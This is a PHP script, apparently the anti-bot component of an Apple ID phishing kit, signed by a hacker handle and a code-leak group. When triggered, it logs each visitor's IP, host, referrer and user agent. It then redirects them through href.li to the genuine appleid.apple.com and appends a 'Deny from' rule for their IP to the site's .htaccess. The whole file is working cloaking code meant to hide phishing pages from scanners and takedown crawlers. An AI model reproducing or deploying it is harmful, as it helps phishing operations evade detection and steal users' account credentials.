<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
FuCked By [!]DNThirTeen
https://www.facebook.com/groups/leakcode/
*/
function DN13_init() {
    if (DN13_check()) {
        DN13_log();
        DN13_exit();
    }
}
function DN13_vars() {
    $date     = date('Y/m/d H:i:s');
    $host     = DN13_remote_host();
    $referrer = DN13_http_referrer();
    $agent    = DN13_user_agent();
    return array(
        $date,
        $host,
        $referrer,
        $agent
    );
}
function DN13_check() {
    $check = isset($_SERVER['REDIRECT_QUERY_STRING']) ? $_SERVER['REDIRECT_QUERY_STRING'] : '';
    return ($check === 'log') ? true : false;
}
function save($file, $text, $type) {
    $fp = fopen($file, $type);
    fwrite($fp, $text);
    fclose($fp);
}
function DN13_log() {
    list($date, $host, $referrer, $agent) = DN13_vars();
    $log = "===[DnThirTeen_IDS]===" . "\n";
    $log .= "Date        : " . $date . "\n";
    $log .= "Address     : " . $_SERVER['REMOTE_ADDR'] . "\n";
    if ($host) {
        $log .= "Host        : " . $host . "\n";
    }
    if ($referrer) {
        $log .= "Referrer    : " . $referrer . "\n";
    }
    $log .= "User Agent  : " . $agent . "\n\n";
    $logz = preg_replace('/(\ )+/', ' ', $log);
    save($_SERVER['DOCUMENT_ROOT'] . '/bot.log', $logz, "a");
}
function DN13_exit() {
    header("Location: https://href.li/?https://appleid.apple.com/");
    $file    = $_SERVER['DOCUMENT_ROOT'] . "/.htaccess";
    $fileget = @file_get_contents($file);
    if (strpos($fileget, $_SERVER['REMOTE_ADDR']) !== false) {
    } else {
        $text = str_replace("#HateCrewDeathRoll", "#Bot Detected!\nDeny from " . $_SERVER['REMOTE_ADDR'] . "\n\n#HateCrewDeathRoll", $fileget);
        return file_put_contents($file, $text);
    }
    exit();
}
function DN13_user_agent() {
    $string = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $match  = isset($_SERVER['REDIRECT_DN13_USER_AGENT']) ? $_SERVER['REDIRECT_DN13_USER_AGENT'] : '';
    return DN13_get_patterns($string, $match);
}
function DN13_remote_host() {
    $string = '';
    $match  = isset($_SERVER['REDIRECT_DN13_REMOTE_HOST']) ? $_SERVER['REDIRECT_DN13_REMOTE_HOST'] : '';
    return DN13_get_patterns($string, $match);
}
function DN13_http_referrer() {
    $string = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $match  = isset($_SERVER['REDIRECT_DN13_HTTP_REFERRER']) ? $_SERVER['REDIRECT_DN13_HTTP_REFERRER'] : '';
    return DN13_get_patterns($string, $match);
}
function DN13_get_patterns($string, $match) {
    $patterns = explode('___', $match);
    foreach ($patterns as $pattern) {
        $string .= (!empty($pattern)) ? ' [' . $pattern . '] ' : '';
    }
    $string = preg_replace('/\s+/', ' ', $string);
    return $string;
}
DN13_init();
?>